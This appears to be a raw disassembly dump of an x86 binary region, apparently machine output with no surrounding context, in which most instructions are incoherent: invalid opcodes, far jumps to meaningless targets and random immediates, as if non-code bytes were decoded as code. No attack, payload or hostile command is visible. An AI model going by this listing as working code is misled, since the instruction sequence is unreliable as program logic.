  425880:	pop    ecx
  425881:	outs   dx,DWORD PTR ds:[esi]
  425882:	pop    ebx
  425883:	dec    edx
  425884:	mov    ?,eax
  425886:	pop    ebp
  425887:	mov    eax,0xa08b9920
  42588c:	push   0x21
  42588e:	mov    ecx,DWORD PTR [eax+eax*1]
	...
  4258f1:	add    BYTE PTR [eax],al
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	mov    al,ds:0xcc8fc837
  425905:	nop
  425906:	add    DWORD PTR [eax],eax
  425908:	add    al,0x1
  42590a:	add    BYTE PTR [eax],al
  42590c:	cmp    al,0xa6
  42590e:	jecxz  0x42589d
  425910:	or     eax,0x9af30dd5
  425915:	call   0x5279f4cd
  42591a:	pushf  
  42591b:	mov    ecx,0xed7c8f58
  425920:	ficom  WORD PTR [edi]
  425922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425923:	aad    0xeb
  425925:	adc    ebx,DWORD PTR [esi+0x23493d68]
  42592b:	lock jbe 0x4258ef
  42592e:	test   BYTE PTR [edi],bl
  425930:	pop    edx
  425931:	mov    ch,ah
  425933:	popa   
  425934:	mov    dh,0x1e
  425936:	call   0x4726:0x1cd0d55f
  42593d:	popa   
  42593e:	(bad)  
  42593f:	popf   
  425940:	inc    ebx
  425941:	enter  0x50ed,0x77
  425945:	repnz in eax,0xc2
  425948:	ins    BYTE PTR es:[edi],dx
  425949:	daa    
  42594a:	jge    0x42593e
  42594c:	adc    DWORD PTR [esi],ebx
  42594e:	(bad)  
  42594f:	xadd   DWORD PTR [ecx-0x5b5f88b2],edi
  425956:	push   ebx
  425957:	push   es
  425958:	outs   dx,BYTE PTR ds:[esi]
  425959:	sub    BYTE PTR [eax+0x3d],bl
  42595c:	cmp    ecx,DWORD PTR [ecx+0x18]
  42595f:	jo     0x42591b
  425961:	cs xchg esi,eax
  425963:	mov    ah,0xaf
  425965:	inc    eax
  425966:	dec    ebx
  425967:	mov    ch,0x15
  425969:	inc    ecx
  42596a:	repz aas 
  42596c:	jmp    0x6288:0x7a936bc0
  425973:	shl    DWORD PTR [edx-0x21],cl
  425976:	(bad)  
  425977:	fwait
  425978:	pop    eax
  425979:	rol    BYTE PTR [edi+eax*2+0xa9c2f01],cl
  425980:	int    0x1b
  425982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425983:	retfw  
  425985:	or     ah,BYTE PTR [ebp+eiz*4-0x3e]
  425989:	inc    eax
  42598a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42598b:	and    eax,0x478e80bd
  425990:	cwde   
  425991:	push   ebx
  425992:	or     DWORD PTR [edi],0x3546c303
  425998:	pop    eax
  425999:	pop    esp
  42599a:	test   eax,0x23828e1
  42599f:	adc    cl,BYTE PTR [eax-0x3ac03c08]
  4259a5:	and    DWORD PTR [esi],ecx
  4259a7:	test   eax,0xfa6ab375
  4259ac:	xchg   esp,edx
  4259ae:	adc    ebx,DWORD PTR [edi+0x130e1e04]
  4259b4:	iret   
  4259b5:	xchg   ebx,eax
  4259b6:	popa   
  4259b7:	cmp    al,0xc
  4259b9:	sub    ebx,DWORD PTR [ebp-0x55f226f5]
  4259bf:	xlat   BYTE PTR ds:[ebx]
  4259c0:	inc    DWORD PTR [edi+0x67c8203c]
  4259c6:	test   eax,0xae9f1ae1
  4259cb:	scas   al,BYTE PTR es:[edi]
  4259cc:	repnz retf 
  4259ce:	imul   edi,DWORD PTR [edi-0x41822530],0xffffffad
  4259d5:	jecxz  0x425a17
  4259d7:	jnp    0x425966
  4259d9:	aam    0xf7
  4259db:	mov    bh,0xad
  4259dd:	cmc    
  4259de:	pop    esp
  4259df:	mov    esp,0xc2e7229c
  4259e4:	fisubr DWORD PTR [edx-0x39]
  4259e7:	and    DWORD PTR [ebp-0x69c6cfa8],0x6fa5f5be
  4259f1:	jnp    0x425996
  4259f3:	mov    edx,DWORD PTR [edx+0x6435ab5d]
  4259f9:	hlt    
  4259fa:	xlat   BYTE PTR ds:[ebx]
  4259fb:	sahf   
  4259fc:	push   ss
  4259fd:	cli    
  4259fe:	dec    esp
  4259ff:	frstor [edx]
  425a01:	mov    eax,0x3bfa2f92
  425a06:	mov    edx,esi
  425a08:	mov    ebx,0x5e7af38c
  425a0d:	out    0x6b,eax
  425a0f:	xchg   esp,eax
	...
  425a74:	shl    DWORD PTR [ebx+0x4],0x67
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0x68b6a3c6]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	cmp    eax,0x2fe6523
  425a91:	jo     0x425a94
  425a93:	xchg   DWORD PTR [ebx-0x54dbbcd5],edi
  425a99:	mov    ecx,0x9afa9b6c
  425a9e:	aas    
  425a9f:	inc    ebp
  425aa0:	das    
  425aa1:	lea    edi,[esi-0x60]
  425aa4:	push   ebp
  425aa5:	xor    BYTE PTR [edx+esi*1],ch
  425aa8:	mov    eax,ds:0x1596a4b1
  425aad:	stos   DWORD PTR es:[edi],eax
  425aae:	mov    dl,0x5c
  425ab0:	dec    edi
  425ab1:	daa    
  425ab2:	js     0x425aec
  425ab4:	pop    esi
  425ab5:	popf   
  425ab6:	sahf   
  425ab7:	addr16 aam 0x39
  425aba:	cwde   
  425abb:	out    dx,eax
  425abc:	in     eax,dx
  425abd:	pop    ebp
  425abe:	sub    bl,dl
  425ac0:	mov    DWORD PTR [ecx+0x45d98d93],ecx
  425ac6:	inc    edx
  425ac7:	cmp    ecx,DWORD PTR [esi+ecx*8]
  425aca:	or     ebx,DWORD PTR [ebx+0x6779a80]
  425ad0:	mov    esi,0x4988b351
  425ad5:	cmp    ah,BYTE PTR [esi]
  425ad7:	xchg   ebx,eax
  425ad8:	bound  esp,QWORD PTR [ecx]
  425ada:	test   cl,0xf4
  425add:	mov    bl,0x42
  425adf:	das    
  425ae0:	inc    eax
  425ae1:	in     al,dx
  425ae2:	lock cmc 
  425ae4:	(bad)  
  425ae5:	into   
  425ae6:	(bad)  
  425ae8:	jmp    0x1fe6:0xc7264256
  425aef:	test   DWORD PTR [edi-0x2ed63390],edx
  425af5:	rcr    DWORD PTR [ecx],0xb0
  425af8:	add    DWORD PTR [esi],edi
  425afa:	aad    0xe0
  425afc:	addr16 inc esp
  425afe:	ins    BYTE PTR es:[edi],dx
  425aff:	call   0xd802:0x75c02439
  425b06:	cmp    BYTE PTR [esi+edx*8],ch
  425b09:	cs cwde 
  425b0b:	xchg   ebp,eax
  425b0c:	mov    eax,0xdd98b1
  425b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b12:	bound  ecx,QWORD PTR [ebx+0x18329fd7]
  425b18:	outs   dx,BYTE PTR ds:[esi]
  425b19:	cwde   
  425b1a:	div    DWORD PTR [esi+0x6]
  425b1d:	pusha  
  425b1e:	hlt    
  425b1f:	pcmpgtb mm7,QWORD PTR [edi+0x6344fa41]
  425b26:	inc    ebp
  425b27:	dec    edi
  425b28:	pusha  
  425b29:	mov    eax,edi
  425b2b:	cmp    eax,edi
  425b2d:	arpl   WORD PTR [eax+0x5a],di
  425b30:	outs   dx,DWORD PTR ds:[esi]
  425b31:	xchg   esi,eax
  425b32:	and    BYTE PTR [ebx],ch
  425b34:	(bad)
  425b37:	cli    
  425b38:	inc    esp
  425b39:	dec    ebp
  425b3a:	xchg   ebp,eax
  425b3b:	jnp    0x425bb4
  425b3d:	dec    ebx
  425b3e:	push   DWORD PTR [edi+0x256d97ee]
  425b44:	mov    eax,0x5b3a62f5
  425b49:	test   DWORD PTR [edi-0x73977594],edi
  425b4f:	lds    eax,FWORD PTR gs:[ecx+0x41]
  425b53:	dec    esi
  425b54:	aad    0xf
  425b56:	mov    eax,ds:0x15aa7e14
  425b5b:	imul   DWORD PTR [ebp+0xed7917c]
  425b61:	adc    ah,bh
  425b63:	std    
  425b64:	pop    edi
  425b65:	or     eax,0x41f49dc
  425b6a:	adc    al,0x92
  425b6c:	test   DWORD PTR [eax-0x1a816526],0xd5b22715
  425b76:	or     eax,0x58beaefe
  425b7b:	aam    0xb8
  425b7d:	je     0x425b19
  425b7f:	sar    BYTE PTR [edi],cl
  425b81:	pop    es
  425b82:	jle    0x425bd0
  425b84:	pop    ds
  425b85:	hlt    
  425b86:	jnp    0x425b9b
  425b88:	sahf   
  425b89:	xchg   ebx,eax
  425b8a:	pop    esp
  425b8b:	xchg   ebp,eax
  425b8c:	out    dx,eax
  425b8d:	ret    
  425b8e:	bound  edi,QWORD PTR [edx+0x0]
	...
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	xor    esp,edx
  425c02:	cmp    DWORD PTR [ebx+0x192d4],0x104
  425c0c:	push   ecx
  425c0d:	dec    eax
  425c0e:	add    BYTE PTR [ebx+0x39],ah
  425c11:	aaa    
  425c12:	in     eax,0x1a
  425c14:	mov    ah,BYTE PTR [ebx]
  425c16:	js     0x425c67
  425c18:	clc    
  425c19:	mov    bl,0xfd
  425c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c1c:	aam    0xf8
  425c1e:	or     esi,edx
  425c20:	inc    edi
  425c21:	lds    eax,FWORD PTR [ebx+0x4681a3e2]
  425c27:	mov    bl,0xb9
  425c29:	bound  eax,QWORD PTR [ecx]
  425c2b:	push   edi
  425c2c:	fwait
  425c2d:	push   edi
  425c2e:	or     BYTE PTR [ebp-0x4f2168c3],al
  425c34:	ja     0x425c3c
  425c36:	mov    al,0x21
  425c38:	push   esp
  425c39:	das    
  425c3a:	push   esi
  425c3b:	cs jo  0x425c19
  425c3e:	jge    0x425c9a
  425c40:	push   0x96ed3079
  425c45:	mov    bl,0x3
  425c47:	jecxz  0x425ca4
  425c49:	cmp    al,0x3a
  425c4b:	push   esp
  425c4c:	pop    ebx
  425c4d:	lahf   
  425c4e:	inc    ecx
  425c4f:	(bad)  
  425c51:	inc    ebx
  425c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c53:	pop    edx
  425c54:	cwde   
  425c55:	test   eax,0xdd2cd03f
  425c5a:	in     al,0x88
  425c5c:	fmul   DWORD PTR [eax+0x6e9edb8c]
  425c62:	cs pop edi
  425c64:	mov    esp,0x11ca2533
  425c69:	mov    eax,ds:0x4cad61db
  425c6e:	cmp    BYTE PTR [edi+0x46c36fb2],0x56
  425c75:	(bad)  
  425c76:	shl    ch,1
  425c78:	or     esi,ebx
  425c7a:	dec    edi
  425c7b:	scas   eax,DWORD PTR es:[edi]
  425c7c:	dec    ecx
  425c7d:	push   ds
  425c7e:	push   cs
  425c7f:	and    bl,BYTE PTR [ecx-0x29]
  425c82:	add    esi,ecx
  425c84:	cmp    BYTE PTR [ecx+edi*4+0x13de7f70],bh
  425c8b:	adc    bh,dh
  425c8d:	int    0xbf
  425c8f:	test   DWORD PTR [edi],ebx
  425c91:	xchg   edi,eax
  425c92:	into   
  425c93:	jmp    0xe269:0xa49b5bec
  425c9a:	xor    al,0x68
  425c9c:	xor    BYTE PTR [edi+ecx*8+0x3b],0xec
  425ca1:	cld    
  425ca2:	sub    al,0xe0
  425ca4:	sbb    eax,0x9597fef
  425ca9:	fnstenv [edi-0x4bf3b90f]
  425caf:	pop    ecx
  425cb0:	xchg   DWORD PTR [ebp-0x380e05e1],ecx
  425cb6:	(bad)  
  425cb7:	int3   
  425cb8:	pop    esi
  425cb9:	pop    ds
  425cba:	sub    BYTE PTR [esi+0x5e5bed2f],ch
  425cc0:	push   ds
  425cc1:	(bad)  
  425cc2:	imul   esi,esi,0x20
  425cc5:	(bad)  
  425cc6:	outs   dx,BYTE PTR ds:[esi]
  425cc7:	aam    0x6e
  425cc9:	in     al,dx
  425cca:	fwait
  425ccb:	lods   eax,DWORD PTR ds:[esi]
  425ccc:	mov    cl,0x9d
  425cce:	icebp  
  425ccf:	and    DWORD PTR [edi-0x5e4271be],edx
  425cd5:	es or  eax,0x9b885ec6
  425cdb:	shr    DWORD PTR [esi+0x74],cl
  425cde:	int3   
  425cdf:	add    ebp,esi
  425ce1:	test   al,0x94
  425ce3:	mov    ?,WORD PTR [edx+eax*8]
  425ce6:	ds daa 
  425ce8:	ins    BYTE PTR es:[edi],dx
  425ce9:	pop    esp
  425cea:	inc    edi
  425ceb:	adc    DWORD PTR ds:0x59965346,edi
  425cf1:	fdivr  QWORD PTR [ebx]
  425cf3:	(bad)  
  425cf4:	aas    
  425cf5:	lds    ecx,FWORD PTR [esi+0x7a]
  425cf8:	out    0xcd,eax
  425cfa:	xchg   ebp,eax
  425cfb:	jmp    0x425c99
  425cfd:	mov    eax,0x2191fc0
  425d02:	ss ss ja 0x425ccd
  425d06:	retf   0xe4da
  425d09:	pop    ss
  425d0a:	in     eax,0xc7
  425d0c:	loope  0x425d3b
  425d0e:	repz sti 
	...
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x46aa4303,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	test   DWORD PTR [edx],0x5e34ad91
  425d92:	ja     0x425d70
  425d94:	and    edi,eax
  425d96:	inc    edi
  425d97:	icebp  
  425d98:	fcom   QWORD PTR [edx]
  425d9a:	jno    0x425de2
  425d9c:	sub    al,0x5a
  425d9e:	inc    esi
  425d9f:	dec    edx
  425da0:	inc    esp
  425da1:	jmp    0x425dca
  425da3:	xchg   edx,eax
  425da4:	mov    WORD PTR [ebx+0x5e913c42],cs
  425daa:	sar    DWORD PTR [edx],1
  425dac:	lds    esp,FWORD PTR [ecx+0x6]
  425daf:	stc    
  425db0:	push   esi
  425db1:	pusha  
  425db2:	adc    ah,dh
  425db4:	push   ebx
  425db5:	retf   
  425db6:	push   ecx
  425db7:	pop    es
  425db8:	shr    ebp,0x59
  425dbb:	(bad)  
  425dbc:	jne    0x425d98
  425dbe:	(bad)  
  425dbf:	adc    bh,dl
  425dc1:	jnp    0x425d6a
  425dc3:	ins    DWORD PTR es:[edi],dx
  425dc4:	stos   DWORD PTR es:[edi],eax
  425dc5:	je     0x425d56
  425dc7:	sbb    eax,0x1d8eafd4
  425dcc:	loopne 0x425d92
  425dce:	inc    edx
  425dcf:	xchg   ebp,eax
  425dd0:	mov    edi,0x9526da06
  425dd5:	repnz gs stos BYTE PTR es:[edi],al
  425dd8:	add    ebp,edx
  425dda:	mov    edx,ecx
  425ddc:	mov    bh,0x9a
  425dde:	nop
  425ddf:	mov    ecx,0x1f0b3e8e
  425de4:	ss loopne 0x425dc0
  425de7:	(bad)  
  425de8:	lods   eax,DWORD PTR ds:[esi]
  425de9:	mov    eax,0x185374c7
  425dee:	cmp    al,BYTE PTR [esi*2-0x2447b3b0]
  425df5:	imul   DWORD PTR ds:0x9c6fcf83
  425dfb:	cmp    BYTE PTR [esi-0x2f],dh
  425dfe:	js     0x425d9c
  425e00:	(bad)  
  425e01:	mov    eax,ds:0xf9c8010b
  425e06:	(bad)
  425e09:	mov    ds:0x656ef3ef,eax
  425e0e:	push   esp
  425e0f:	pop    DWORD PTR [edi+ebx*1+0x65dace7c]
  425e16:	xchg   edi,eax
  425e17:	adc    eax,0x956217ed
  425e1c:	inc    esp
  425e1d:	mov    esi,0xef134ca1
  425e22:	shl    ebx,cl
  425e24:	daa    
  425e25:	inc    ecx
  425e26:	je     0x425e41
  425e28:	pop    esi
  425e29:	imul   eax,DWORD PTR [edx-0x27ab8d4b],0xded97899
  425e33:	jge    0x425e01
  425e35:	push   edi
  425e36:	out    dx,al
  425e37:	(bad)  
  425e38:	ins    BYTE PTR es:[edi],dx
  425e39:	mov    ah,0x5c
  425e3b:	pop    esp
  425e3c:	mov    ss:0x70f0fe1a,eax
  425e42:	push   edi
  425e43:	jle    0x425dd3
  425e45:	xchg   cl,ch
  425e47:	mov    ah,BYTE PTR [ebx]
  425e49:	and    BYTE PTR [edx+0x72],bl
  425e4c:	scas   al,BYTE PTR es:[edi]
  425e4d:	scas   eax,DWORD PTR es:[edi]
  425e4e:	xor    al,0x86
  425e50:	scas   eax,DWORD PTR es:[edi]
  425e51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e52:	mov    eax,DWORD PTR [esi+0x7f3b2261]
  425e58:	jno    0x425e8f
  425e5a:	repz fisub DWORD PTR [eax-0x6e]
  425e5e:	fild   QWORD PTR [edi+0x5a]
  425e61:	push   cs
  425e62:	mov    WORD PTR [ebp-0x6c153d67],es
  425e68:	pop    eax
  425e69:	pop    ecx
  425e6a:	adc    ebx,DWORD PTR [ebp-0x19]
  425e6d:	jne    0x425e7d
  425e6f:	fdiv   QWORD PTR [eax+0xe01f248]
  425e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e76:	shr    DWORD PTR [esi-0x30],0x5f
  425e7a:	mov    bh,0xb6
  425e7c:	xlat   BYTE PTR ds:[ebx]
  425e7d:	mov    dh,0x8a
  425e7f:	inc    eax
  425e80:	aaa    
  425e81:	out    dx,eax
  425e82:	cmp    eax,0xd828dc8a
  425e87:	dec    ebp
  425e88:	sbb    BYTE PTR [esi+eax*8],al
  425e8b:	enter  0xfdf4,0x46
  425e8f:	ins    BYTE PTR es:[edi],dx
	...
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	pop    es
  425f01:	mov    BYTE PTR [edx+0x2d],cl
  425f04:	fcom   QWORD PTR [ecx+eax*1+0x10400]
  425f0b:	add    al,dh
  425f0d:	fwait
  425f0e:	std    
  425f0f:	xor    eax,0x6ef5ac9f
  425f14:	lock inc edi
  425f16:	loope  0x425f79
  425f18:	frstor [edi-0x6d]
  425f1b:	xchg   bl,ch
  425f1d:	jg     0x425ef5
  425f1f:	shr    ah,0xf7
  425f22:	lods   al,BYTE PTR ds:[esi]
  425f23:	aas    
  425f24:	rcr    ch,0x7
  425f27:	pop    edx
  425f28:	loopne 0x425eda
  425f2a:	mov    ds:0x431d2326,eax
  425f2f:	jbe    0x425f3f
  425f31:	adc    al,0xf9
  425f33:	call   0xadb702d8
  425f38:	mov    BYTE PTR [esi+eiz*8-0x51],0x5f
  425f3d:	dec    esp
  425f3e:	jmp    0xfb6f:0x9716351d
  425f45:	inc    esi
  425f46:	mov    ds:0xdd8bdbab,eax
  425f4b:	repnz cmp eax,0x6ef5a4ba
  425f51:	xor    al,0xf8
  425f53:	clc    
  425f54:	out    dx,al
  425f55:	fidivr DWORD PTR [ecx]
  425f57:	nop
  425f58:	xor    al,0x2b
  425f5a:	cwde   
  425f5b:	adc    esp,ebp
  425f5d:	jl     0x425ef8
  425f5f:	rcr    DWORD PTR [ecx-0x2a2247],cl
  425f65:	pop    ecx
  425f66:	arpl   WORD PTR [edi+0x7b3c2cd7],bp
  425f6c:	xchg   edi,eax
  425f6d:	retf   0xb3bd
  425f70:	add    ebx,edi
  425f72:	mov    al,gs:0x3dc0d7e6
  425f78:	and    DWORD PTR [esp+ebx*8-0x76],eax
  425f7c:	push   edx
  425f7d:	sbb    esi,DWORD PTR [edi]
  425f7f:	mov    eax,ds:0x5d53a12e
  425f84:	adc    BYTE PTR [ebx+0x76],al
  425f87:	pop    edi
  425f88:	int3   
  425f89:	fstp   st(5)
  425f8b:	or     eax,DWORD PTR [eax-0x2ff923c1]
  425f91:	(bad)  
  425f92:	and    dh,al
  425f94:	dec    esi
  425f95:	sti    
  425f96:	push   eax
  425f97:	or     edi,DWORD PTR [ecx+0x50]
  425f9a:	sbb    edi,esp
  425f9c:	inc    ebp
  425f9d:	push   esi
  425f9e:	or     eax,0x87f49c10
  425fa3:	mov    edi,0x8b286d4b
  425fa8:	xlat   BYTE PTR ds:[ebx]
  425fa9:	(bad)  
  425faa:	stc    
  425fab:	dec    esp
  425fac:	xchg   ebp,eax
  425fad:	push   ds
  425fae:	push   ebx
  425faf:	mov    bh,0x67
  425fb1:	push   ss
  425fb2:	es test al,0xc0
  425fb5:	sbb    eax,0x299ef1d3
  425fba:	or     al,0xc
  425fbc:	mov    eax,ds:0xb4eb0982
  425fc1:	addr16 (bad) 
  425fc3:	inc    BYTE PTR [edx+0x878e57b]
  425fc9:	(bad)  
  425fca:	lods   al,BYTE PTR ds:[esi]
  425fcb:	les    edx,FWORD PTR [eax]
  425fcd:	push   cs
  425fce:	add    dh,BYTE PTR [esi+ebx*8]
  425fd1:	inc    esp
  425fd2:	fnstenv [ecx]
  425fd4:	pop    ebp
  425fd5:	mov    bl,BYTE PTR [edx]
  425fd7:	sub    DWORD PTR [esi-0x17e66681],esi
  425fdd:	inc    esp
  425fde:	sub    al,0xb1
  425fe0:	pop    ds
  425fe1:	xchg   ebx,eax
  425fe2:	xchg   ebp,eax
  425fe3:	or     BYTE PTR [esp+ebp*1+0x4a013c33],dh
  425fea:	popf   
  425feb:	jmp    0x1d5:0x7b2dc4ad
  425ff2:	cmp    edi,DWORD PTR [edx]
  425ff4:	xchg   esi,eax
  425ff5:	pop    es
  425ff6:	sub    ch,dh
  425ff8:	sar    DWORD PTR [eax+0x7f],0x6c
  425ffc:	jae    0x42600f
  425ffe:	repz xlat BYTE PTR ds:[ebx]
  426000:	cld    
  426001:	lahf   
  426002:	pop    esp
  426003:	(bad)
  426006:	and    edi,edi
  426008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426009:	dec    edx
  42600a:	fmul   DWORD PTR [ecx+ebp*8-0x34]
  42600e:	inc    edx
  42600f:	lds    eax,FWORD PTR [eax]
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	dec    esi
  426081:	bound  ebx,QWORD PTR [edi+esi*1-0x20]
  426085:	xchg   ebp,eax
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	je     0x4260a7
  42608e:	out    dx,al
  42608f:	mov    dh,0x8f
  426091:	pop    ecx
  426092:	adc    DWORD PTR [edx],edx
  426094:	xchg   esi,eax
  426095:	jl     0x426071
  426097:	out    dx,eax
  426098:	xchg   esi,eax
  426099:	add    esp,DWORD PTR [eax]
  42609b:	sbb    eax,0x2ad846d3
  4260a0:	cwde   
  4260a1:	xchg   ecx,eax
  4260a2:	shl    BYTE PTR [edi-0x449fa43d],cl
  4260a8:	pop    ecx
  4260a9:	add    BYTE PTR [edx],cl
  4260ab:	idiv   BYTE PTR [esi]
  4260ad:	sub    ebp,DWORD PTR [esi+0xb]
  4260b0:	push   esi
  4260b1:	les    edx,FWORD PTR [ebx-0x1248a48e]
  4260b7:	add    dl,BYTE PTR [ebx]
  4260b9:	dec    esi
  4260ba:	mov    esp,0x78404be0
  4260bf:	add    DWORD PTR [edx],ebx
  4260c1:	mov    eax,ds:0x2ff2a524
  4260c6:	or     BYTE PTR [ebp-0x8],bl
  4260c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4260ca:	(bad)  
  4260cb:	cld    
  4260cc:	xchg   ebx,eax
  4260cd:	ror    BYTE PTR [edx],0x7a
  4260d0:	lock or BYTE PTR [eax+0x3d],ah
  4260d4:	rcr    DWORD PTR [ecx],1
  4260d6:	mov    ah,0x46
  4260d8:	(bad)  
  4260da:	push   0xffffff85
  4260dc:	xchg   ebp,eax
  4260dd:	stc    
  4260de:	pop    edi
  4260df:	in     eax,dx
  4260e0:	or     esi,DWORD PTR [ebx-0x18]
  4260e3:	push   esi
  4260e4:	xchg   ebx,eax
  4260e5:	std    
  4260e6:	and    ecx,DWORD PTR [esi]
  4260e8:	cld    
  4260e9:	out    0x41,eax
  4260eb:	sub    al,0x2d
  4260ed:	iret   
  4260ee:	test   al,0xbc
  4260f0:	pop    esp
  4260f1:	add    eax,0xe4d9defc
  4260f6:	mov    edi,DWORD PTR [edi+0x54f624da]
  4260fc:	lea    eax,[edi]
  4260fe:	shl    BYTE PTR [ebx-0x75949785],cl
  426104:	sub    DWORD PTR [edi+0x15],0x62ef3b6b
  42610b:	sbb    BYTE PTR [esi+0x52],ch
  42610e:	jmp    0x542a:0x49b2d415
  426115:	lock arpl ax,ax
  426118:	outs   dx,DWORD PTR ds:[esi]
  426119:	jno    0x426103
  42611b:	or     eax,0x33c9fd6c
  426120:	xor    eax,0x1ecab2c3
  426125:	hlt    
  426126:	mov    bl,0x32
  426128:	jbe    0x426113
  42612a:	xor    ah,dh
  42612c:	or     BYTE PTR ds:0xec2aab76,bh
  426132:	inc    esp
  426133:	leave  
  426134:	test   BYTE PTR [ebx+0x4c97e38d],cl
  42613a:	push   ebp
  42613b:	pop    ebx
  42613c:	mov    bh,0xf7
  42613e:	das    
  42613f:	sub    ch,al
  426141:	xor    esi,DWORD PTR [edx+0x6571d75c]
  426147:	idiv   DWORD PTR [esi-0x28f910e5]
  42614d:	pop    ecx
  42614e:	imul   edi,DWORD PTR [edi-0x3a360b32],0xb39c7c80
  426158:	and    eax,0x12c255d1
  42615d:	sbb    eax,0x275c59a3
  426162:	ja     0x4261bb
  426164:	mov    dl,0xd6
  426166:	mov    ecx,0x73cd24d
  42616b:	shr    BYTE PTR [esi-0x7d],cl
  42616e:	stos   BYTE PTR es:[edi],al
  42616f:	xchg   ebx,eax
  426170:	dec    esi
  426171:	inc    ebx
  426172:	retf   
  426173:	inc    bx
  426175:	jle    0x426175
  426177:	push   cs
  426178:	repz fs test al,0x21
  42617c:	pop    ss
  42617d:	adc    BYTE PTR [ecx+0x3b],dl
  426180:	and    ebp,ecx
  426182:	or     DWORD PTR [esp+ecx*2+0x15],ebp
  426186:	arpl   ax,ax
  426188:	xchg   esp,eax
  426189:	mov    edi,0xd864417c
  42618e:	or     edi,edx
	...
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx+0x7c48a627],0x47
  426204:	in     al,0x96
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	add    bh,ah
  42620e:	and    eax,0xdd38e2d
  426213:	test   eax,0x1468507b
  426218:	ret    
  426219:	sbb    al,0xab
  42621b:	xchg   edx,eax
  42621c:	frstor [edi+0xe]
  42621f:	not    DWORD PTR [ecx+0x7654bdb2]
  426225:	fs scas al,BYTE PTR es:[edi]
  426227:	and    eax,0x11d2c42
  42622c:	mov    ebx,ecx
  42622e:	push   0x397ffe97
  426233:	xor    al,0x85
  426235:	imul   edi,DWORD PTR [esi],0x19
  426238:	mov    ah,BYTE PTR [edx+eax*8+0x4d048670]
  42623f:	aas    
  426240:	jne    0x426291
  426242:	bound  edi,QWORD PTR [ebp-0x78a4c537]
  426248:	sub    esp,ebp
  42624a:	out    0x70,al
  42624c:	and    BYTE PTR [esi],bl
  42624e:	sbb    al,0x18
  426250:	and    al,0xf6
  426252:	and    esp,DWORD PTR [ecx-0x34]
  426255:	stos   DWORD PTR es:[edi],eax
  426256:	aam    0x5b
  426258:	xchg   esi,eax
  426259:	inc    ebp
  42625a:	cmp    BYTE PTR [ebp-0x574c8264],dh
  426260:	sub    edi,DWORD PTR [ebp+0x26]
  426263:	rcr    DWORD PTR [edi],cl
  426265:	jns    0x426297
  426267:	xchg   esp,eax
  426268:	lock cmp al,0xf7
  42626b:	iret   
  42626c:	or     edi,edi
  42626e:	add    cl,bh
  426270:	pop    esp
  426271:	lock push ebp
  426273:	clc    
  426274:	lock imul edi,DWORD PTR ds:0x432f38aa,0x7a1fdca2
  42627f:	imul   eax,DWORD PTR [edi+0x13],0x96b3bf4f
  426286:	call   0x7af90d4f
  42628b:	retf   0x3191
  42628e:	mov    edx,0x211054a6
  426293:	sbb    DWORD PTR [edi],ebp
  426295:	xor    al,0xc2
  426297:	xchg   esi,eax
  426298:	mov    bh,0x6b
  42629a:	sahf   
  42629b:	(bad)  
  42629c:	test   al,0x61
  42629e:	xchg   edx,eax
  42629f:	xchg   DWORD PTR [ebx-0x35],edi
  4262a2:	lods   al,BYTE PTR ds:[esi]
  4262a3:	mov    ss,WORD PTR [ebx]
  4262a5:	adc    DWORD PTR [esi-0x428bb347],edi
  4262ab:	sbb    al,0x1a
  4262ad:	je     0x426244
  4262af:	jge    0x426266
  4262b1:	lahf   
  4262b2:	sub    BYTE PTR [edi+edi*2],bh
  4262b5:	test   al,0xfa
  4262b7:	ja     0x426314
  4262b9:	sub    esi,DWORD PTR [ecx]
  4262bb:	bndstx [esi-0x42],bnd1
  4262bf:	xchg   ecx,eax
  4262c0:	test   DWORD PTR [edx+0x6d],ecx
  4262c3:	clc    
  4262c4:	jo     0x4262a6
  4262c6:	arpl   WORD PTR [edx],ax
  4262c8:	imul   esi,DWORD PTR [esi+0x4d],0x9a963279
  4262cf:	stc    
  4262d0:	shr    edi,cl
  4262d2:	ds or  edi,esp
  4262d5:	test   eax,0x36016fd3
  4262da:	jbe    0x4262c1
